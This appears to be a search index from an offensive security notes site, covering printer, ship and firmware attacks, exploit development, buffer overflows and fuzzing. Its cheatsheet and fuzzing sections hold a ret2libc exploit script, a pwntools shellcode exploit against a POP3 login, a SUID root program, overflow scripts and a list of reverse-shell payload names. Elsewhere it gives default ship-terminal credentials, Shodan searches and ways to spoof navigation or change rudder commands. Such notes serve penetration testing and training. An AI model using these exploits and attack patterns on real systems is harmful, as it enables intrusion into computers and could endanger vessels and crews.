http://h.foofus.net/?page_id=218 Exploitation PRET - Printer Exploitation Toolkit: https://github.com/RUB-NDS/PRET Attack Patterns Plunder Pillage Print: https://hackinparis.com/data/slides/2014/DeralHeilandandPeterArzamendi.pdf LDAP/SMB/SMTP Pass-Back-Attack: http://foofus.net/goons/percx/praeda/pass-back-attack.pdf LDAP - power address book functionality SMB - saving scans to file shares SMTP - scan to email Export configuration and look for credentials LDAP traffic is unencrypted (usually), can MITM Guides An Introduction to Printer Exploitation: https://0x00sec.org/t/an-introduction-to-printer-exploitation/3565","title":"Printers"},{"location":"embedded-and-iot/specific/printers/#printers","text":"","title":"Printers"},{"location":"embedded-and-iot/specific/printers/#discovery","text":"","title":"Discovery"},{"location":"embedded-and-iot/specific/printers/#windows","text":"SharpPrinter - Discover Printers: https://github.com/rvrsh3ll/SharpPrinter ListNetworks - Enumerate all visible network printers in local network: https://github.com/vinifr/-ListNetworks","title":"Windows"},{"location":"embedded-and-iot/specific/printers/#linux","text":"Praeda - Automated printer data harvesting tool: http://h.foofus.net/?page_id=218","title":"Linux"},{"location":"embedded-and-iot/specific/printers/#exploitation","text":"PRET - Printer Exploitation Toolkit: https://github.com/RUB-NDS/PRET","title":"Exploitation"},{"location":"embedded-and-iot/specific/printers/#attack-patterns","text":"Plunder Pillage Print: https://hackinparis.com/data/slides/2014/DeralHeilandandPeterArzamendi.pdf LDAP/SMB/SMTP Pass-Back-Attack: http://foofus.net/goons/percx/praeda/pass-back-attack.pdf LDAP - power address book functionality SMB - saving scans to file shares SMTP - scan to email Export configuration and look for credentials LDAP traffic is unencrypted (usually), can MITM","title":"Attack Patterns"},{"location":"embedded-and-iot/specific/printers/#guides","text":"An Introduction to Printer Exploitation: https://0x00sec.org/t/an-introduction-to-printer-exploitation/3565","title":"Guides"},{"location":"embedded-and-iot/specific/ships/","text":"Ships Shodan searches org:\"Inmarsat Solutions US\" Login for Globe wireless title:\"sailor 900\" Sat antenna details Exploit: https://www.exploit-db.com/exploits/35932 Default credentials: admin/1234 html:commbox KVH CommBox terminals Vessel name / network structure leaked \"Show Users\" link (or can request the content by appending /rest.php?action=QCgetActiveUsers) Vuln Ship Tracker https://ptp-shiptracker.herokuapp.com/ Terms ECDIS are the electronic chart systems that are needed to navigate. AIS transceiver - system that ships use to avoid colliding with each other. NMEA 0183 messages Ethernet and serial networks are often \u2018bridged\u2019 at several points (GPS,satcom terminal, ECDIS) OT systems are used to control the steering gear, engines, ballast pumps and lots more. They communicate using NMEA 0183 messages. No message authentication, encryption or validation (only 2 byte XOR checksum) Attack Patterns Spoof the ECDIS using the vulnerable config interface, 'grow' the ship and 'jump' it in to the shipping lanes. Other ships AIS will alert the ships captain to a collision scenario MitM and change NMEA 0183 messages to read differently Ex: change the rudder command by modifying a GPS autopilot command References Summarized References https://www.pentestpartners.com/security-blog/osint-from-ship-satcoms/ https://www.pentestpartners.com/security-blog/hacking-tracking-stealing-and-sinking-ships/","title":"Ships"},{"location":"embedded-and-iot/specific/ships/#ships","text":"","title":"Ships"},{"location":"embedded-and-iot/specific/ships/#shodan-searches","text":"org:\"Inmarsat Solutions US\" Login for Globe wireless title:\"sailor 900\" Sat antenna details Exploit: https://www.exploit-db.com/exploits/35932 Default credentials: admin/1234 html:commbox KVH CommBox terminals Vessel name / network structure leaked \"Show Users\" link (or can request the content by appending /rest.php?action=QCgetActiveUsers)","title":"Shodan searches"},{"location":"embedded-and-iot/specific/ships/#vuln-ship-tracker","text":"https://ptp-shiptracker.herokuapp.com/","title":"Vuln Ship Tracker"},{"location":"embedded-and-iot/specific/ships/#terms","text":"ECDIS are the electronic chart systems that are needed to navigate. AIS transceiver - system that ships use to avoid colliding with each other. NMEA 0183 messages Ethernet and serial networks are often \u2018bridged\u2019 at several points (GPS,satcom terminal, ECDIS) OT systems are used to control the steering gear, engines, ballast pumps and lots more. They communicate using NMEA 0183 messages. No message authentication, encryption or validation (only 2 byte XOR checksum)","title":"Terms"},{"location":"embedded-and-iot/specific/ships/#attack-patterns","text":"Spoof the ECDIS using the vulnerable config interface, 'grow' the ship and 'jump' it in to the shipping lanes. Other ships AIS will alert the ships captain to a collision scenario MitM and change NMEA 0183 messages to read differently Ex: change the rudder command by modifying a GPS autopilot command","title":"Attack Patterns"},{"location":"embedded-and-iot/specific/ships/#references","text":"","title":"References"},{"location":"embedded-and-iot/specific/ships/#summarized-references","text":"https://www.pentestpartners.com/security-blog/osint-from-ship-satcoms/ https://www.pentestpartners.com/security-blog/hacking-tracking-stealing-and-sinking-ships/","title":"Summarized References"},{"location":"embedded-and-iot/specific/uefi/","text":"UEFI References UEFI_EXPLOITATION_MASSES_FINAL: https://github.com/eclypsium/Publications/blob/master/2018/DEFCON26/DC26_UEFI_EXPLOITATION_MASSES_FINAL.pdf EDK II Project A modern, feature-rich, cross-platform firmware development environment for the UEFI and PI specifications from www.uefi.org. GitHub: https://github.com/tianocore/edk2 RaspberryPiPkg 64-bit Tiano Core UEFI for the Raspberry Pi 3 (with devices, Linux, NetBSD, FreeBSD and Windows on Arm!) GitHub: https://github.com/andreiw/RaspberryPiPkg uefi-firmware-parser Parse BIOS/Intel ME/UEFI firmware related structures: Volumes, FileSystems, Files, etc GitHub: https://github.com/theopolis/uefi-firmware-parser","title":"UEFI"},{"location":"embedded-and-iot/specific/uefi/#uefi","text":"","title":"UEFI"},{"location":"embedded-and-iot/specific/uefi/#references","text":"UEFI_EXPLOITATION_MASSES_FINAL: https://github.com/eclypsium/Publications/blob/master/2018/DEFCON26/DC26_UEFI_EXPLOITATION_MASSES_FINAL.pdf","title":"References"},{"location":"embedded-and-iot/specific/uefi/#edk-ii-project","text":"A modern, feature-rich, cross-platform firmware development environment for the UEFI and PI specifications from www.uefi.org. GitHub: https://github.com/tianocore/edk2","title":"EDK II Project"},{"location":"embedded-and-iot/specific/uefi/#raspberrypipkg","text":"64-bit Tiano Core UEFI for the Raspberry Pi 3 (with devices, Linux, NetBSD, FreeBSD and Windows on Arm!) GitHub: https://github.com/andreiw/RaspberryPiPkg","title":"RaspberryPiPkg"},{"location":"embedded-and-iot/specific/uefi/#uefi-firmware-parser","text":"Parse BIOS/Intel ME/UEFI firmware related structures: Volumes, FileSystems, Files, etc GitHub: https://github.com/theopolis/uefi-firmware-parser","title":"uefi-firmware-parser"},{"location":"embedded-and-iot/techniques/glitching/","text":"Glitching References voltage glitching attacks: https://twitter.com/d_olex/status/1084700474043813895","title":"Glitching"},{"location":"embedded-and-iot/techniques/glitching/#glitching","text":"","title":"Glitching"},{"location":"embedded-and-iot/techniques/glitching/#references","text":"voltage glitching attacks: https://twitter.com/d_olex/status/1084700474043813895","title":"References"},{"location":"embedded-and-iot/techniques/side-channel/","text":"Side Channel References Intel TLBleed: https://www.theregister.co.uk/2018/06/22/intel_tlbleed_key_data_leak/","title":"Side Channel"},{"location":"embedded-and-iot/techniques/side-channel/#side-channel","text":"","title":"Side Channel"},{"location":"embedded-and-iot/techniques/side-channel/#references","text":"Intel TLBleed: https://www.theregister.co.uk/2018/06/22/intel_tlbleed_key_data_leak/","title":"References"},{"location":"exploits-and-shellcoding/0-cheatsheet/","text":"Cheatsheet Exploit Development Print hex encoded string in text printf $(cat file.txt | tr -d '\\n') Cross compile with - mingw32 i586-mingw32msvc-gcc a.c wine a.exe Passing binary data as arguments command $(python -c 'print ...') Passing binary data as standard input python -c 'print ...' | command Use file as input and then read from standard input cat file - | command python -c 'print ...' | cat file - | command Printing shell code (Bash) echo -e '\\x31\\xc0\\x50\\x68\\x2f...' (Python) python -c 'print \\x31\\xc0\\x50\\x68\\x2f... ' (Perl) perl -e 'print \\x31\\xc0\\x50\\x68\\x2f... ' ret2libc Find libc address: \u200b ldd /usr/local/bin/backup Find libc system function: \u200b readelf -s /lib32/libc.so.6 | grep system Find libc exit function: \u200b readelf -s /lib32/libc.so.6 | grep exit Find libc /bin/sh reference: \u200b strings -a -t x /lib32/libc.so.6 | grep /bin/sh import struct, subprocess libc = 0xf75e2000 sysOffset = 0x0003a940 sysAddress = libc + sysOffset exitOffset = 0x0002e7b0 exitAddress = libc + exitOffset binsh = libc + 0x0015900b payload = A * 512 payload += struct.pack( I , sysAddress) payload += struct.pack( I , exitAddress) payload += struct.pack( I , binsh) attempts = 0 while True: attempts += 1 print Attempts: + attempts subprocess.call([ /usr/local/bin/vulnerable-binary , arg1 , arg2 , payload]) Network attack from pwn import * shellcode = \\x6a\\x02\\x5b\\x6a\\x29\\x58\\xcd\\x80\\x48\\x89\\xc6\\x31\\xc9\\x56\\x5b\\x6a\\x3f\\x58\\xc d\\x80\\x41\\x80\\xf9\\x03\\x75\\xf5\\x6a\\x0b\\x58\\x99\\x52\\x31\\xf6\\x56\\x68\\x2f\\x2f\\x7 3\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\xcd\\x80 payload = A *28 + p32(0xffffd630) + shellcode r = remote('10.10.10.34', 7411) print r.recv(1024) r.sendline('USER admin') print r.recv(1024) r.sendline('PASS ' + payload) r.interactive() Simple SUID Binary #include stdio.h #include stdlib.h #include sys/types.h #include unistd.h int main() { setuid(0); system( id ); return 0; } Msfvenum Payloads cmd/unix/bind_awk cmd/unix/bind_busybox_telnetd cmd/unix/bind_inetd cmd/unix/bind_lua cmd/unix/bind_netcat cmd/unix/bind_netcat_gaping cmd/unix/bind_netcat_gaping_ipv6 cmd/unix/bind_nodejs cmd/unix/bind_perl cmd/unix/bind_perl_ipv6 cmd/unix/bind_r cmd/unix/bind_ruby cmd/unix/bind_ruby_ipv6 cmd/unix/bind_socat_udp cmd/unix/bind_stub cmd/unix/bind_zsh cmd/unix/generic cmd/unix/reverse cmd/unix/reverse_awk cmd/unix/reverse_bash cmd/unix/reverse_bash_telnet_ssl cmd/unix/reverse_ksh cmd/unix/reverse_lua cmd/unix/reverse_ncat_ssl cmd/unix/reverse_netcat cmd/unix/reverse_netcat_gaping cmd/unix/reverse_nodejs cmd/unix/reverse_openssl cmd/unix/reverse_perl cmd/unix/reverse_perl_ssl cmd/unix/reverse_php_ssl cmd/unix/reverse_python cmd/unix/reverse_python_ssl cmd/unix/reverse_r cmd/unix/reverse_ruby cmd/unix/reverse_ruby_ssl cmd/unix/reverse_socat_udp cmd/unix/reverse_ssl_double_telnet cmd/unix/reverse_stub cmd/unix/reverse_zsh cmd/windows/adduser cmd/windows/generic cmd/windows/powershell_bind_tcp cmd/windows/powershell_reverse_tcp cmd/windows/reverse_powershell firefox/exec firefox/shell_bind_tcp firefox/shell_reverse_tcp generic/shell_bind_tcp generic/shell_reverse_tcp java/shell/bind_tcp java/shell/reverse_tcp java/shell_reverse_tcp linux/x64/exec linux/x64/shell/bind_tcp linux/x64/shell/reverse_tcp linux/x64/shell_bind_tcp linux/x64/shell_reverse_tcp linux/x86/adduser linux/x86/chmod linux/x86/exec linux/x86/shell/bind_tcp linux/x86/shell/reverse_tcp linux/x86/shell_bind_tcp linux/x86/shell_reverse_tcp multi/meterpreter/reverse_http multi/meterpreter/reverse_https nodejs/shell_bind_tcp nodejs/shell_reverse_tcp osx/armle/shell/bind_tcp osx/armle/shell/reverse_tcp osx/armle/shell_bind_tcp osx/armle/shell_reverse_tcp osx/ppc/shell/bind_tcp osx/ppc/shell/reverse_tcp osx/ppc/shell_bind_tcp osx/ppc/shell_reverse_tcp osx/x64/exec osx/x64/shell_bind_tcp osx/x64/shell_reverse_tcp osx/x86/exec osx/x86/shell_bind_tcp osx/x86/shell_reverse_tcp php/bind_php php/download_exec php/exec php/reverse_perl php/reverse_php php/shell_findsock python/shell_bind_tcp python/shell_reverse_tcp r/shell_bind_tcp r/shell_reverse_tcp ruby/shell_bind_tcp ruby/shell_reverse_tcp windows/adduser windows/dllinject/bind_tcp windows/dllinject/reverse_tcp windows/download_exec windows/exec windows/powershell_bind_tcp windows/powershell_reverse_tcp windows/shell/bind_tcp windows/shell/reverse_tcp windows/shell_bind_tcp windows/shell_reverse_tcp windows/upexec/bind_tcp windows/upexec/reverse_tcp windows/x64/exec windows/x64/powershell_bind_tcp windows/x64/powershell_reverse_tcp windows/x64/shell/bind_tcp windows/x64/shell/reverse_tcp windows/x64/shell_bind_tcp windows/x64/shell_reverse_tcp","title":"Cheatsheet"},{"location":"exploits-and-shellcoding/0-cheatsheet/#cheatsheet","text":"","title":"Cheatsheet"},{"location":"exploits-and-shellcoding/0-cheatsheet/#exploit-development","text":"","title":"Exploit Development"},{"location":"exploits-and-shellcoding/0-cheatsheet/#print-hex-encoded-string-in-text","text":"printf $(cat file.txt | tr -d '\\n')","title":"Print hex encoded string in text"},{"location":"exploits-and-shellcoding/0-cheatsheet/#cross-compile-with-mingw32","text":"i586-mingw32msvc-gcc a.c wine a.exe","title":"Cross compile with - mingw32"},{"location":"exploits-and-shellcoding/0-cheatsheet/#passing-binary-data-as-arguments","text":"command $(python -c 'print ...')","title":"Passing binary data as arguments"},{"location":"exploits-and-shellcoding/0-cheatsheet/#passing-binary-data-as-standard-input","text":"python -c 'print ...' | command","title":"Passing binary data as standard input"},{"location":"exploits-and-shellcoding/0-cheatsheet/#use-file-as-input-and-then-read-from-standard-input","text":"cat file - | command python -c 'print ...' | cat file - | command","title":"Use file as input and then read from standard input"},{"location":"exploits-and-shellcoding/0-cheatsheet/#printing-shell-code","text":"(Bash) echo -e '\\x31\\xc0\\x50\\x68\\x2f...' (Python) python -c 'print \\x31\\xc0\\x50\\x68\\x2f... ' (Perl) perl -e 'print \\x31\\xc0\\x50\\x68\\x2f... '","title":"Printing shell code"},{"location":"exploits-and-shellcoding/0-cheatsheet/#ret2libc","text":"Find libc address: \u200b ldd /usr/local/bin/backup Find libc system function: \u200b readelf -s /lib32/libc.so.6 | grep system Find libc exit function: \u200b readelf -s /lib32/libc.so.6 | grep exit Find libc /bin/sh reference: \u200b strings -a -t x /lib32/libc.so.6 | grep /bin/sh import struct, subprocess libc = 0xf75e2000 sysOffset = 0x0003a940 sysAddress = libc + sysOffset exitOffset = 0x0002e7b0 exitAddress = libc + exitOffset binsh = libc + 0x0015900b payload = A * 512 payload += struct.pack( I , sysAddress) payload += struct.pack( I , exitAddress) payload += struct.pack( I , binsh) attempts = 0 while True: attempts += 1 print Attempts: + attempts subprocess.call([ /usr/local/bin/vulnerable-binary , arg1 , arg2 , payload])","title":"ret2libc"},{"location":"exploits-and-shellcoding/0-cheatsheet/#network-attack","text":"from pwn import * shellcode = \\x6a\\x02\\x5b\\x6a\\x29\\x58\\xcd\\x80\\x48\\x89\\xc6\\x31\\xc9\\x56\\x5b\\x6a\\x3f\\x58\\xc d\\x80\\x41\\x80\\xf9\\x03\\x75\\xf5\\x6a\\x0b\\x58\\x99\\x52\\x31\\xf6\\x56\\x68\\x2f\\x2f\\x7 3\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\xcd\\x80 payload = A *28 + p32(0xffffd630) + shellcode r = remote('10.10.10.34', 7411) print r.recv(1024) r.sendline('USER admin') print r.recv(1024) r.sendline('PASS ' + payload) r.interactive()","title":"Network attack"},{"location":"exploits-and-shellcoding/0-cheatsheet/#simple-suid-binary","text":"#include stdio.h #include stdlib.h #include sys/types.h #include unistd.h int main() { setuid(0); system( id ); return 0; }","title":"Simple SUID Binary"},{"location":"exploits-and-shellcoding/0-cheatsheet/#msfvenum","text":"","title":"Msfvenum"},{"location":"exploits-and-shellcoding/0-cheatsheet/#payloads","text":"cmd/unix/bind_awk cmd/unix/bind_busybox_telnetd cmd/unix/bind_inetd cmd/unix/bind_lua cmd/unix/bind_netcat cmd/unix/bind_netcat_gaping cmd/unix/bind_netcat_gaping_ipv6 cmd/unix/bind_nodejs cmd/unix/bind_perl cmd/unix/bind_perl_ipv6 cmd/unix/bind_r cmd/unix/bind_ruby cmd/unix/bind_ruby_ipv6 cmd/unix/bind_socat_udp cmd/unix/bind_stub cmd/unix/bind_zsh cmd/unix/generic cmd/unix/reverse cmd/unix/reverse_awk cmd/unix/reverse_bash cmd/unix/reverse_bash_telnet_ssl cmd/unix/reverse_ksh cmd/unix/reverse_lua cmd/unix/reverse_ncat_ssl cmd/unix/reverse_netcat cmd/unix/reverse_netcat_gaping cmd/unix/reverse_nodejs cmd/unix/reverse_openssl cmd/unix/reverse_perl cmd/unix/reverse_perl_ssl cmd/unix/reverse_php_ssl cmd/unix/reverse_python cmd/unix/reverse_python_ssl cmd/unix/reverse_r cmd/unix/reverse_ruby cmd/unix/reverse_ruby_ssl cmd/unix/reverse_socat_udp cmd/unix/reverse_ssl_double_telnet cmd/unix/reverse_stub cmd/unix/reverse_zsh cmd/windows/adduser cmd/windows/generic cmd/windows/powershell_bind_tcp cmd/windows/powershell_reverse_tcp cmd/windows/reverse_powershell firefox/exec firefox/shell_bind_tcp firefox/shell_reverse_tcp generic/shell_bind_tcp generic/shell_reverse_tcp java/shell/bind_tcp java/shell/reverse_tcp java/shell_reverse_tcp linux/x64/exec linux/x64/shell/bind_tcp linux/x64/shell/reverse_tcp linux/x64/shell_bind_tcp linux/x64/shell_reverse_tcp linux/x86/adduser linux/x86/chmod linux/x86/exec linux/x86/shell/bind_tcp linux/x86/shell/reverse_tcp linux/x86/shell_bind_tcp linux/x86/shell_reverse_tcp multi/meterpreter/reverse_http multi/meterpreter/reverse_https nodejs/shell_bind_tcp nodejs/shell_reverse_tcp osx/armle/shell/bind_tcp osx/armle/shell/reverse_tcp osx/armle/shell_bind_tcp osx/armle/shell_reverse_tcp osx/ppc/shell/bind_tcp osx/ppc/shell/reverse_tcp osx/ppc/shell_bind_tcp osx/ppc/shell_reverse_tcp osx/x64/exec osx/x64/shell_bind_tcp osx/x64/shell_reverse_tcp osx/x86/exec osx/x86/shell_bind_tcp osx/x86/shell_reverse_tcp php/bind_php php/download_exec php/exec php/reverse_perl php/reverse_php php/shell_findsock python/shell_bind_tcp python/shell_reverse_tcp r/shell_bind_tcp r/shell_reverse_tcp ruby/shell_bind_tcp ruby/shell_reverse_tcp windows/adduser windows/dllinject/bind_tcp windows/dllinject/reverse_tcp windows/download_exec windows/exec windows/powershell_bind_tcp windows/powershell_reverse_tcp windows/shell/bind_tcp windows/shell/reverse_tcp windows/shell_bind_tcp windows/shell_reverse_tcp windows/upexec/bind_tcp windows/upexec/reverse_tcp windows/x64/exec windows/x64/powershell_bind_tcp windows/x64/powershell_reverse_tcp windows/x64/shell/bind_tcp windows/x64/shell/reverse_tcp windows/x64/shell_bind_tcp windows/x64/shell_reverse_tcp","title":"Payloads"},{"location":"exploits-and-shellcoding/buffer-overflow/","text":"Buffer Overflow Introductions Buffer Overflow Attack - Computerphile: https://www.youtube.com/watch?v=1S0aBV-Waeo Binary Exploitation - Buffer Overflow Explained in Detail: https://0xrick.github.io/binary-exploitation/bof1/ Testing tools Program to detect the existence of remote / local stack-based buffer-overflow vulnerabilities (FTP, IMAP, POP3 and SMTP): https://github.com/iricartb/buffer-overflow-vulnerability-services-tester-tool https://hakin9.org/bovstt-buffer-overflow-vulnerability-services-tester-tool/ Generating Random Patterns locate pattern_create pattern_create.rb 2700 pattern_offset.rb 39624438 Bad characters Use all hex combinations and append that to buffer (\\x01\\x02) Finding Gadgets When main program is not memory protected EDB - Op code searcher Example : ESP - EIP When main program is memory protected Find a var that loads a memory location into and offset that Find a module with no memory protection and memory module address (base) does not contain any bad characters !mona modules Open modules and open the selected module (e) Search for a instructions JUMP ESP PUSH ESP RTN If not found look at modules list (m) and check in other sections (if DEP or ASLR is not enabled) nasm_shell jmp esp (to get get opcode) FF E4 !mona find -s \\xff\\xe4 -m slmfc.dll","title":"Buffer Overflow"},{"location":"exploits-and-shellcoding/buffer-overflow/#buffer-overflow","text":"","title":"Buffer Overflow"},{"location":"exploits-and-shellcoding/buffer-overflow/#introductions","text":"Buffer Overflow Attack - Computerphile: https://www.youtube.com/watch?v=1S0aBV-Waeo Binary Exploitation - Buffer Overflow Explained in Detail: https://0xrick.github.io/binary-exploitation/bof1/","title":"Introductions"},{"location":"exploits-and-shellcoding/buffer-overflow/#testing-tools","text":"Program to detect the existence of remote / local stack-based buffer-overflow vulnerabilities (FTP, IMAP, POP3 and SMTP): https://github.com/iricartb/buffer-overflow-vulnerability-services-tester-tool https://hakin9.org/bovstt-buffer-overflow-vulnerability-services-tester-tool/","title":"Testing tools"},{"location":"exploits-and-shellcoding/buffer-overflow/#generating-random-patterns","text":"locate pattern_create pattern_create.rb 2700 pattern_offset.rb 39624438","title":"Generating Random Patterns"},{"location":"exploits-and-shellcoding/buffer-overflow/#bad-characters","text":"Use all hex combinations and append that to buffer (\\x01\\x02)","title":"Bad characters"},{"location":"exploits-and-shellcoding/buffer-overflow/#finding-gadgets","text":"","title":"Finding Gadgets"},{"location":"exploits-and-shellcoding/buffer-overflow/#when-main-program-is-not-memory-protected","text":"EDB - Op code searcher Example : ESP - EIP","title":"When main program is not memory protected"},{"location":"exploits-and-shellcoding/buffer-overflow/#when-main-program-is-memory-protected","text":"Find a var that loads a memory location into and offset that Find a module with no memory protection and memory module address (base) does not contain any bad characters !mona modules Open modules and open the selected module (e) Search for a instructions JUMP ESP PUSH ESP RTN If not found look at modules list (m) and check in other sections (if DEP or ASLR is not enabled) nasm_shell jmp esp (to get get opcode) FF E4 !mona find -s \\xff\\xe4 -m slmfc.dll","title":"When main program is memory protected"},{"location":"exploits-and-shellcoding/fuzzing/","text":"Fuzzing Tools American fuzzy lop is a security-oriented fuzzer: http://lcamtuf.coredump.cx/afl/ A fork of AFL for fuzzing Windows binaries: https://github.com/googleprojectzero/winafl Using WinAFL to Fizz WinRar (unacev2.dll): https://research.checkpoint.com/extracting-code-execution-from-winrar/ FoRTE-Research's Fuzzing Benchmarks: https://github.com/FoRTE-Research/FoRTE-FuzzBench Python Network Fuzzer (SMTP?) #!/usr/bin/python import socket # Create an array of buffers, from 10 to 2000, with increments of 20. #buffer = \u2018A\u2019 2700 buffer=[ A ] counter=100 while len(buffer) = 30: buffer.append( A *counter) counter=counter+200 for string in buffer: print Fuzzing PASS with %s bytes % len(string) s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) connect=s.connect(('10.0.0.22',110)) s.recv(1024) s.send('USER test\\r\\n') s.recv(1024) s.send('PASS ' + string + '\\r\\n') s.send('QUIT\\r\\n') s.close() Python Bad Character Scanner #!/usr/bin/python import socket s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) badchars = ( \\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10 \\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20 \\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30 \\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40 \\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50 \\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60 \\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70 \\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80 \\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90 \\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0 \\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0 \\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0 \\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0 \\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0 \\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0 \\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff ) buffer= A *2606 + B *4 + badchars try: print \\nSending evil buffer... s.connect(('10.0.0.22',110)) data = s.recv(1024) s.send('USER username' +'\\r\\n') data = s.recv(1024) s.send('PASS ' + buffer + '\\r\\n') s.close() print \\nDone! except: print Could not connect to POP3!","title":"Fuzzing"},{"location":"exploits-and-shellcoding/fuzzing/#fuzzing","text":"","title":"Fuzzing"},{"location":"exploits-and-shellcoding/fuzzing/#tools","text":"American fuzzy lop is a security-oriented fuzzer: http://lcamtuf.coredump.cx/afl/ A fork of AFL for fuzzing Windows binaries: https://github.com/googleprojectzero/winafl Using WinAFL to Fizz WinRar (unacev2.dll): https://research.checkpoint.com/extracting-code-execution-from-winrar/ FoRTE-Research's Fuzzing Benchmarks: https://github.com/FoRTE-Research/FoRTE-FuzzBench","title":"Tools"},{"location":"exploits-and-shellcoding/fuzzing/#python-network-fuzzer-smtp","text":"#!/usr/bin/python import socket # Create an array of buffers, from 10 to 2000, with increments of 20. #buffer = \u2018A\u2019 2700 buffer=[ A ] counter=100 while len(buffer) = 30: buffer.append( A *counter) counter=counter+200 for string in buffer: print Fuzzing PASS with %s bytes % len(string) s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) connect=s.connect(('10.0.0.22',110)) s.recv(1024) s.send('USER test\\r\\n') s.recv(1024) s.send('PASS ' + string + '\\r\\n') s.send('QUIT\\r\\n') s.close()","title":"Python Network Fuzzer (SMTP?)"},{"location":"exploits-and-shellcoding/fuzzing/#python-bad-character-scanner","text":"#!/usr/bin/python import socket s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) badchars = ( \\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10 \\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20 \\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30 \\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40 \\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50 \\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60 \\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70 \\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80 \\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90 \\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0 \\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0 \\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0 \\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0 \\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0 \\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0 \\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff ) buffer= A *2606 + B *4 + badchars try: print \\nSending evil buffer... s.connect(('10.0.0.22',110)) data = s.recv(1024) s.send('USER username' +'\\r\\n') data = s.recv(1024) s.send('PASS ' + buffer + '\\r\\n') s.close() print \\nDone! except: print Could not connect to POP3!","title":"Python Bad Character Scanner"},{"location":"exploits-and-shellcoding/lateral-movement/","text":"Lateral Movement LATERAL MOVEMENT USING THE MMC20.APPLICATION COM OBJECT: https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/ LATERAL MOVEMENT VIA DCOM: ROUND 2: https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/ LATERAL MOVEMENT USING EXCEL.APPLICATION AND DCOM: https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/ Lateral Movement Using Outlook\u2019s CreateObject Method and DotNetToJScript: https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-and-dotnettojscript/","title":"Lateral Movement"},{"location":"exploits-and-shellcoding/lateral-movement/#lateral-movement","text":"LATERAL MOVEMENT USING THE 